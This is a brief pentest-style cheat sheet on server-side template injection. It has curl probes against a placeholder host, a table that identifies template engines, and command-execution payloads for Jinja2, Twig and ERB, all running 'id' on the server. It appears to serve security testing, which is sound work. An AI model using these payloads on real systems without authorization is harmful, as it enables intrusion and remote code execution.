# Server-side template injection (SSTI)

Check previews, email/PDF templates, CMS content, greetings.

## First check
```bash
curl -sG 'http://<IP>/preview' --data-urlencode 'name=probe-plain-end'
curl -sG 'http://<IP>/preview' --data-urlencode 'name=probe-{{7*7}}-end'
curl -sG 'http://<IP>/preview' --data-urlencode 'name=probe-{{7*8}}-end'
```
Expect `probe-49-end`, `probe-56-end`.

| Probe | Engine |
| --- | --- |
| `{{7*7}}` | Jinja, Twig, other curly-brace |
| `${7*7}` | FreeMarker, other dollar-expression |
| `<%= 7*7 %>` | ERB, other tag-based |
| `{{7*'7'}}` | Jinja → `7777777`; Twig → `49` |

## After evaluation
```text
Jinja2: {{ cycler.__init__.__globals__.os.popen('id').read() }}
Twig:   {{ ['id']|filter('system') }}
ERB:    <%= `id` %>
```
- Sandbox/context may block these. Judge by raw response, not browser DOM.
